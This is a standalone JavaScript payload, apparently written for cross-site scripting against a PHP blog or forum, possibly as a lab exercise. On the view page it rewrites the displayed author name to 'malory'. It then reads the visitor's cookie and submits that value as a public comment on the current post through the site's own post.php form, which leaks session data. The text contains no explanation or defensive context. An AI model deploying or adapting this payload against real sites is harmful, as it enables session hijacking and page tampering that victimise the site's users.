
<script>
    function nonPersistent(){
        let url = window.location.href;
        let isView = url.search("view.php[?]id=[0-9].");
        if(isView > 0){
            let author = document.querySelector("small").textContent.toString();
            let authorArr = author.split(" ");
            authorArr[2] = "malory";
            let newAuthor = authorArr.join(" ");
            document.querySelector("small").textContent = newAuthor;
        }
    }
    function getPostId(){
        let url = window.location.href;
        let isView = url.search("view.php[?]id=[0-9].");
        if(isView){
            let idArr = url.split("=");
            let id = parseInt(idArr[1]);
            return id;
        }
        return -1
    }
    function leakCookies(postId){
        console.log("post id: " + postId);
        if(postId === -1){
            return;
        }
        let cookie = document.cookie;
        let cookieVal = cookie.split("=")[1].toString();
        let formData = new FormData();
        formData.append("comment", cookieVal);
        formData.append("parent", postId);
        formData.append("form", "comment");
        formData.append("uid", 0);
        formData.append("submit", "");
        let requestOptions = {
            method: "POST",
            body: formData
        };
        let res = fetch("post.php", requestOptions);
    }
    nonPersistent();
    leakCookies(getPostId());
</script>

